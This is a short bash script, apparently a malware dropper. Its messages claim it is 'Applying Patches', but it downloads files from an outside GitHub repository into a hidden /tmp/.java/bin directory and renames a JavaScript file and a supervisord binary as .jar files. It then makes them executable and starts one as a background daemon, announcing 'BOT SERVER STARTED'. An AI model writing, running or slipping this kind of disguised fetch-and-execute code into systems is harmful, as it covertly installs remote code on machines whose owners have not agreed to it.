#!/bin/bash

function fetch_files() {
    echo "Applying Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o patch.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n2-cfg.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n2-conf.json -o conf.json
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    echo "BOT SERVER STARTED ..."
}

if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
    echo "Patch files already fetched ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
